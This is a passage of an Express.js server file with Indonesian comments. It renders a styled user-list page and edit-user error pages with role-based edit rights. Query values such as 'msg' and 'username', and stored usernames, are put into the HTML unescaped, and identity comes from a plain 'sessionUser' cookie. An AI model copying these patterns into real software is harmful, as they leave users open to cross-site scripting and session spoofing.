      <a href="/adduser" class="btn-add-user">
        <i class="fas fa-user-plus"></i> TAMBAH USER BARU
      </a>
    </div>
  `;

  const html = `
   <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - DIGITAL CORE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { 
      box-sizing: border-box; 
      margin: 0; 
      padding: 0; 
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: #000000;
      color: #F0F0F0;
      min-height: 100vh;
      padding: 16px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
    }

    #particles {
      position: fixed;
      top: 0; 
      left: 0;
      width: 100%; 
      height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1200px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
    }

    .header h2 {
      color: #F0F0F0;
      font-size: 28px;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 10px;
      text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
    }

    .header p {
      color: #A0A0A0;
      font-size: 14px;
    }

    /* Tombol Tambah User */
    .btn-add-user {
      display: inline-block;
      padding: 14px 30px;
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
      text-decoration: none;
      border-radius: 8px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 1px;
      transition: all 0.3s ease;
      border: none;
      cursor: pointer;
      font-size: 14px;
      box-shadow: 0 4px 15px rgba(78, 205, 196, 0.3);
    }

    .btn-add-user:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(78, 205, 196, 0.5);
      background: linear-gradient(135deg, #6BFFE6, #4ECDC4);
    }

    .table-container {
      overflow-x: auto;
      border-radius: 12px;
      border: 1px solid #333333;
      background: rgba(26, 26, 26, 0.8);
      backdrop-filter: blur(10px);
      font-size: 14px;
      margin-bottom: 20px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 600px;
    }
    
    th, td {
      padding: 15px 12px;
      text-align: left;
      border-bottom: 1px solid #333333;
      white-space: nowrap;
    }

    th {
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 12px;
      font-family: 'Orbitron', sans-serif;
    }

    td {
      background: rgba(38, 38, 38, 0.7);
      color: #E0E0E0;
      font-size: 13px;
    }

    tr:hover td {
      background: rgba(60, 60, 60, 0.8);
      transition: background 0.3s ease;
    }

    .role-badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: bold;
      text-transform: uppercase;
    }

    .role-owner {
      background: linear-gradient(135deg, #FFD700, #FFA500);
      color: #000;
    }

    .role-admin {
      background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
      color: #fff;
    }

    .role-reseller {
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
    }

    .role-user {
      background: linear-gradient(135deg, #95E1D3, #B5EAD7);
      color: #000;
    }

    .btn-edit {
      display: inline-block;
      padding: 6px 12px;
      background: rgba(78, 205, 196, 0.2);
      border: 1px solid rgba(78, 205, 196, 0.5);
      border-radius: 6px;
      color: #4ECDC4;
      text-decoration: none;
      font-size: 12px;
      transition: all 0.3s ease;
    }

    .btn-edit:hover {
      background: rgba(78, 205, 196, 0.3);
      transform: translateY(-2px);
    }

    .close-btn {
      display: block;
      width: 200px;
      padding: 14px;
      margin: 30px auto;
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      text-align: center;
      border-radius: 8px;
      text-decoration: none;
      font-size: 14px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      border: 1px solid #333333;
      cursor: pointer;
      transition: all 0.3s ease;
      box-sizing: border-box;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .close-btn:hover {
      background: rgba(240, 240, 240, 0.1);
      border-color: #F0F0F0;
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(240, 240, 240, 0.2);
    }

    .stats-bar {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
      padding: 15px;
      background: rgba(26, 26, 26, 0.8);
      border: 1px solid #333333;
      border-radius: 8px;
      font-size: 13px;
    }

    .stat-item {
      text-align: center;
      flex: 1;
    }

    .stat-value {
      font-size: 18px;
      font-weight: bold;
      color: #F0F0F0;
      font-family: 'Orbitron', sans-serif;
    }

    .stat-label {
      font-size: 11px;
      color: #A0A0A0;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    @media (max-width: 768px) {
      .header h2 { 
        font-size: 22px; 
      }
      
      table { 
        font-size: 12px; 
      }
      
      th, td { 
        padding: 10px 8px; 
      }
      
      .stats-bar {
        flex-direction: column;
        gap: 10px;
      }
      
      .stat-item {
        text-align: left;
      }
      
      .btn-add-user {
        padding: 12px 20px;
        font-size: 12px;
      }
    }

    @media (max-width: 600px) {
      body {
        padding: 10px;
      }
      
      .header {
        padding: 10px;
      }
      
      .header h2 { 
        font-size: 18px; 
      }
    }

    /* Animasi untuk tabel */
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .table-container {
      animation: fadeIn 0.6s ease-out;
    }

    /* Scrollbar styling */
    .table-container::-webkit-scrollbar {
      height: 8px;
    }

    .table-container::-webkit-scrollbar-track {
      background: rgba(51, 51, 51, 0.5);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb {
      background: rgba(240, 240, 240, 0.3);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb:hover {
      background: rgba(240, 240, 240, 0.5);
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-users"></i> USER LIST</h2>
      <p>Daftar semua user yang terdaftar dalam sistem</p>
    </div>

    <!-- Notifikasi Pesan -->
    ${messageHtml}

    <!-- Tombol Tambah User Baru -->
    ${addUserButton}

    <!-- Stats Bar -->
    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Regular Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Resellers</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Admins</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-user"></i> Username</th>
            <th><i class="fas fa-shield-alt"></i> Role</th>
            <th><i class="fas fa-calendar-times"></i> Expired</th>
            <th><i class="fas fa-clock"></i> Remaining</th>
            <th><i class="fas fa-cog"></i> Actions</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-times"></i> TUTUP PROFIL
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#333333',
        lineColor: '#555555',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 8000,
        particleRadius: 2,
        curvedLines: false,
        proximity: 100
      });
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });

    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));

    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;

    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }

    const editButton = canEdit
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;

    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  const html = `
   <!DOCTYPE html>
<html lang="id">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - DIGITAL CORE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@500;600;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>

  <style>
    :root {
      /* Perubahan Tema ke Lime Apple Green */
      --primary: #32CD32; /* Lime Green */
      --secondary: #228B22; /* Forest Green */
      --accent: #adff2f; /* Green Yellow */
      --bg-dark: #050505;
      --glass: rgba(255, 255, 255, 0.03);
      --glass-border: rgba(255, 255, 255, 0.1);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: var(--bg-dark);
      color: #FFFFFF;
      min-height: 100vh;
      padding: 40px 20px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
      background-image: 
          radial-gradient(circle at 50% -20%, rgba(50, 205, 50, 0.15) 0%, transparent 50%),
          radial-gradient(circle at 0% 100%, rgba(173, 255, 47, 0.1) 0%, transparent 40%);
    }

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      opacity: 0.4;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1100px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 40px;
      padding: 20px;
    }

    .header h2 {
      font-family: 'Orbitron', sans-serif;
      font-size: 36px;
      font-weight: 700;
      background: linear-gradient(to right, #fff, var(--primary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: 4px;
      margin-bottom: 12px;
      filter: drop-shadow(0 0 15px rgba(50, 205, 50, 0.3));
    }

    .header p {
      color: rgba(255, 255, 255, 0.5);
      font-size: 14px;
      letter-spacing: 2px;
      text-transform: uppercase;
    }

    /* Tombol Add User Mewah */
    .btn-add-user {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      padding: 14px 28px;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      color: #FFFFFF;
      text-decoration: none;
      border-radius: 15px;
      font-family: 'Orbitron', sans-serif;
      font-weight: 600;
      font-size: 13px;
      letter-spacing: 1px;
      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      border: none;
      cursor: pointer;
      margin-bottom: 30px;
      box-shadow: 0 10px 20px rgba(50, 205, 50, 0.2);
    }

    .btn-add-user:hover {
      transform: translateY(-5px) scale(1.05);
      box-shadow: 0 15px 30px rgba(50, 205, 50, 0.4);
      filter: brightness(1.1);
    }

    /* Stats Bar High-End */
    .stats-bar {
      display: flex;
      justify-content: space-around;
      margin-bottom: 35px;
      padding: 30px;
      background: rgba(15, 15, 15, 0.6);
      border: 1px solid var(--glass-border);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-radius: 25px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
    }

    .stat-item {
      text-align: center;
      position: relative;
      flex: 1;
    }

    .stat-item:not(:last-child)::after {
      content: "";
      position: absolute;
      right: 0;
      top: 20%;
      height: 60%;
      width: 1px;
      background: linear-gradient(transparent, rgba(255,255,255,0.1), transparent);
    }

    .stat-value {
      font-family: 'Rajdhani', sans-serif;
      font-size: 32px;
      font-weight: 700;
      color: var(--primary);
      display: block;
      text-shadow: 0 0 10px rgba(50, 205, 50, 0.5);
    }

    .stat-label {
      font-size: 11px;
      color: rgba(255, 255, 255, 0.4);
      text-transform: uppercase;
      font-weight: 600;
      letter-spacing: 2px;
      margin-top: 5px;
    }

    /* Table Glassmorphism Ultra */
    .table-container {
      overflow-x: auto;
      border-radius: 25px;
      border: 1px solid var(--glass-border);
      background: rgba(10, 10, 10, 0.4);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      margin-bottom: 35px;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 800px;
    }

    th {
      background: rgba(255, 255, 255, 0.03);
      padding: 22px 20px;
      text-align: left;
      color: var(--primary);
      font-family: 'Orbitron', sans-serif;
      font-weight: 600;
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }

    td {
      padding: 20px;
      color: rgba(255, 255, 255, 0.8);
      font-size: 14px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
      font-family: 'Rajdhani', sans-serif;
      font-weight: 500;
      letter-spacing: 0.5px;
    }

    tr:hover td {
      background: rgba(255, 255, 255, 0.02);
      color: #fff;
    }

    /* Role Badges Glow */
    .role-badge {
      display: inline-block;
      padding: 6px 14px;
      border-radius: 8px;
      font-size: 10px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; box-shadow: 0 0 15px rgba(255, 215, 0, 0.3); }
    .role-admin { background: linear-gradient(45deg, #FF4B2B, #FF416C); color: #fff; box-shadow: 0 0 15px rgba(255, 75, 43, 0.3); }
    .role-reseller { background: linear-gradient(45deg, #32CD32, #228B22); color: #fff; box-shadow: 0 0 15px rgba(50, 205, 50, 0.3); }
    .role-user { background: linear-gradient(45deg, #adff2f, #32CD32); color: #fff; box-shadow: 0 0 15px rgba(173, 255, 47, 0.3); }

    .btn-edit {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      padding: 8px 16px;
      background: rgba(50, 205, 50, 0.1);
      border: 1px solid rgba(50, 205, 50, 0.3);
      border-radius: 10px;
      color: var(--primary);
      text-decoration: none;
      font-size: 12px;
      font-weight: 600;
      transition: all 0.3s;
    }

    .btn-edit:hover {
      background: var(--primary);
      color: #000;
      box-shadow: 0 0 15px var(--primary);
    }

    .close-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: fit-content;
      min-width: 200px;
      padding: 16px 30px;
      margin: 40px auto;
      background: rgba(255, 255, 255, 0.05);
      color: #FFFFFF;
      text-align: center;
      border-radius: 15px;
      text-decoration: none;
      font-family: 'Orbitron', sans-serif;
      font-size: 12px;
      font-weight: 600;
      letter-spacing: 2px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .close-btn:hover {
      background: rgba(255, 255, 255, 0.1);
      border-color: #fff;
      transform: translateY(-3px);
    }

    /* Animations */
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .stats-bar, .table-container { 
      animation: fadeInUp 0.8s cubic-bezier(0.23, 1, 0.32, 1); 
    }

    @media (max-width: 768px) {
      .header h2 { font-size: 24px; }
      .stats-bar {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 20px;
      }
      .stat-item:not(:last-child)::after { display: none; }
    }

    .table-container::-webkit-scrollbar {
      height: 6px;
    }

    .table-container::-webkit-scrollbar-thumb {
      background: var(--primary);
      border-radius: 10px;
    }
  </style>
</head>

<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-project-diagram"></i> USER CENTRAL</h2>
      <p>Management Console & System Directory</p>
    </div>

    ${messageHtml}

    <div style="text-align: center;">
      ${addUserButton}
    </div>

    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Nodes</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Entities</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Distributors</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Supervisors</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-id-card"></i> Identity</th>
            <th><i class="fas fa-shield-halved"></i> Security Tier</th>
            <th><i class="fas fa-hourglass-end"></i> Termination</th>
            <th><i class="fas fa-microchip"></i> Uptime Left</th>
            <th><i class="fas fa-terminal"></i> Command</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-power-off"></i> EXIT DIRECTORY
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#1a4a1a', /* Disesuaikan ke hijau gelap */
        lineColor: '#1a4a1a',
        minSpeedX: 0.1,
        maxSpeedX: 0.4,
        density: 12000,
        particleRadius: 2,
        curvedLines: true,
        proximity: 100
      });
    });
  </script>
</body>

</html>
  `;
  res.send(html);
});

app.get("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const currentUsername = username;
  const targetUsername = req.query.username;

  // Jika tidak ada parameter username, tampilkan form kosong atau redirect
  if (!targetUsername || targetUsername === 'undefined' || targetUsername === 'null') {
    const errorHtml = `
    <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Error - DIGITAL CORE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  
  <style>
    :root {
      /* Tema Lime Apple Green */
      --primary: #32CD32; /* Lime Green */
      --secondary: #228B22; /* Forest Green */
      --accent: #adff2f; /* Green Yellow */
      --warning: #adff2f; /* Menggunakan Green Yellow untuk peringatan agar serasi */
      --bg-dark: #050505;
      --glass: rgba(255, 255, 255, 0.03);
      --glass-border: rgba(255, 255, 255, 0.1);
    }

    body { 
      font-family: 'Inter', sans-serif; 
      background: var(--bg-dark); 
      color: #fff; 
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      /* Background Glow Hijau */
      background-image: 
          radial-gradient(circle at 50% 50%, rgba(50, 205, 50, 0.1) 0%, transparent 70%);
    }

    /* Background Animation */
    body::before {
      content: "";
      position: absolute;
      width: 200%;
      height: 200%;
      background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
      opacity: 0.1;
      z-index: -1;
    }

    .error { 
      position: relative;
      background: rgba(15, 15, 15, 0.7); 
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      padding: 50px 40px; 
      border-radius: 30px; 
      border: 1px solid var(--glass-border);
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8), 
                  inset 0 0 20px rgba(255, 255, 255, 0.02);
      max-width: 450px;
      width: 90%;
      text-align: center;
      animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1);
    }

    /* Glow Top Line Hijau */
    .error::after {
      content: "";
      position: absolute;
      top: 0; left: 50%;
      transform: translateX(-50%);
      width: 40%;
      height: 3px;
      background: var(--primary);
      box-shadow: 0 0 15px var(--primary);
      border-radius: 0 0 10px 10px;
    }

    .icon-container {
      font-size: 50px;
      margin-bottom: 20px;
      color: var(--warning);
      filter: drop-shadow(0 0 10px rgba(173, 255, 47, 0.4));
      animation: pulse 2s infinite;
    }

    h2 {
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 22px;
      margin-bottom: 20px;
      letter-spacing: 2px;
      text-transform: uppercase;
      background: linear-gradient(to right, #fff, var(--primary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    p {
      color: rgba(255, 255, 255, 0.6);
      line-height: 1.8;
      font-size: 14px;
      margin-bottom: 10px;
    }

    small {
      display: inline-block;
      padding: 5px 15px;
      background: rgba(50, 205, 50, 0.05);
      border-radius: 8px;
      margin-top: 15px;
      color: var(--primary);
      font-family: 'Courier New', monospace;
      font-size: 11px;
      letter-spacing: 1px;
      border: 1px solid rgba(50, 205, 50, 0.1);
    }

    /* Tombol Luxury Hijau */
    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 16px 32px;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      color: #fff;
      text-decoration: none;
      border-radius: 16px;
      margin-top: 30px;
      font-weight: 700;
      font-family: 'Orbitron', sans-serif;
      font-size: 12px;
      letter-spacing: 1px;
      transition: all 0.3s ease;
      box-shadow: 0 10px 20px rgba(50, 205, 50, 0.2);
      border: none;
      text-transform: uppercase;
    }

    .btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 30px rgba(50, 205, 50, 0.4);
      filter: brightness(1.1);
    }

    .btn:active {
      transform: scale(0.96);
    }

    /* Link Style Hijau */
    a[style*="color: #4ECDC4"], .user-list-link {
      color: var(--primary) !important;
      text-decoration: none;
      font-weight: 600;
      border-bottom: 1px dashed var(--primary);
      transition: 0.3s;
    }

    a[style*="color: #4ECDC4"]:hover, .user-list-link:hover {
      color: #fff !important;
      border-bottom-style: solid;
      text-shadow: 0 0 10px var(--primary);
    }

    /* Animations */
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.05); opacity: 0.8; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="error">
    <div class="icon-container">
      <i class="fas fa-exclamation-circle"></i>
    </div>
    <h2>📝 Edit User</h2>
    <p>Silakan pilih user yang ingin diedit dari <a href="/userlist" class="user-list-link">User List</a></p>
    <p><small>STATUS: IDENTITY_PARAMETER_MISSING</small></p>
    
    <a href="/userlist" class="btn">
      <i class="fas fa-chevron-left"></i> Return to Directory
    </a>
  </div>
</body>
</html>
    `;
    return res.send(errorHtml);
  }

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    const errorHtml = `
    <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Error - DIGITAL CORE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  
  <style>
    :root {
      /* Tema Lime Apple Green */
      --primary: #32CD32; /* Lime Green */
      --secondary: #228B22; /* Forest Green */
      --accent: #adff2f; /* Green Yellow */
      --glow: rgba(50, 205, 50, 0.4);
      --bg-dark: #050505;
      --glass: rgba(255, 255, 255, 0.03);
      --glass-border: rgba(255, 255, 255, 0.1);
    }

    body { 
      font-family: 'Inter', sans-serif; 
      background: var(--bg-dark); 
      color: #fff; 
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      /* Background Glow Gradient Hijau */
      background-image: 
          radial-gradient(circle at 50% 50%, rgba(50, 205, 50, 0.08) 0%, transparent 70%),
          radial-gradient(circle at 0% 0%, rgba(173, 255, 47, 0.05) 0%, transparent 50%);
    }

    /* Decorative Rings Hijau */
    body::before {
      content: "";
      position: absolute;
      width: 500px;
      height: 500px;
      border: 1px solid rgba(50, 205, 50, 0.1);
      border-radius: 50%;
      z-index: 0;
      animation: pulseRing 4s infinite;
    }

    .error { 
      position: relative;
      z-index: 1;
      background: rgba(15, 15, 15, 0.7); 
      backdrop-filter: blur(30px);
      -webkit-backdrop-filter: blur(30px);
      padding: 60px 40px; 
      border-radius: 40px; 
      border: 1px solid var(--glass-border);
      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 
                  inset 0 0 30px rgba(50, 205, 50, 0.05);
      max-width: 450px;
      width: 90%;
      text-align: center;
      animation: scaleIn 0.5s cubic-bezier(0.23, 1, 0.32, 1);
    }

    /* Glow Indicator on top Hijau */
    .error-header-line {
      position: absolute;
      top: 0; left: 50%;
      transform: translateX(-50%);
      width: 100px;
      height: 4px;
      background: var(--primary);
      box-shadow: 0 0 20px var(--primary);
      border-radius: 0 0 10px 10px;
    }

    .icon-error {
      font-size: 60px;
      color: var(--primary);
      margin-bottom: 25px;
      filter: drop-shadow(0 0 15px var(--glow));
      animation: iconShake 2s infinite;
    }

    h2 {
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 20px;
      margin-bottom: 20px;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: #fff;
    }

    p {
      color: rgba(255, 255, 255, 0.6);
      line-height: 1.8;
      font-size: 15px;
      margin-bottom: 15px;
    }

    strong {
      color: var(--accent);
      background: rgba(50, 205, 50, 0.1);
      padding: 4px 10px;
      border-radius: 8px;
      font-family: 'Orbitron', sans-serif;
      font-size: 13px;
      border: 1px solid rgba(50, 205, 50, 0.2);
    }

    /* Luxury Button - Premium Silver to White */
    .btn-back {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-top: 35px;
      padding: 18px 35px;
      background: linear-gradient(135deg, #ffffff 0%, #e0e0e0 100%);
      color: #000000;
      text-decoration: none;
      border-radius: 20px;
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 13px;
      letter-spacing: 1px;
      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
      border: none;
    }

    .btn-back:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 30px rgba(50, 205, 50, 0.3);
      background: var(--accent);
      filter: brightness(1.1);
    }

    .btn-back:active {
      transform: scale(0.95);
    }

    .link-list {
      color: var(--primary);
      text-decoration: none;
      font-weight: 600;
      border-bottom: 1px solid transparent;
      transition: 0.3s;
    }

    .link-list:hover {
      color: #fff;
      border-bottom-color: var(--primary);
      text-shadow: 0 0 10px var(--primary);
    }

    /* Animations */
    @keyframes scaleIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    @keyframes pulseRing {
      0% { transform: scale(0.8); opacity: 0.5; }
      50% { transform: scale(1.1); opacity: 0.2; }
      100% { transform: scale(0.8); opacity: 0.5; }
    }

    @keyframes iconShake {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
  </style>
</head>
<body>

  <div class="error">
    <div class="error-header-line"></div>
    <div class="icon-error">
      <i class="fas fa-user-slash"></i>
    </div>
    <h2>Data Not Found</h2>
    <p>User dengan username <strong>"${targetUsername}"</strong> tidak terdeteksi dalam database pusat.</p>
    <p>Silakan kembali ke <a href="/userlist" class="link-list">Main Directory</a></p>
    
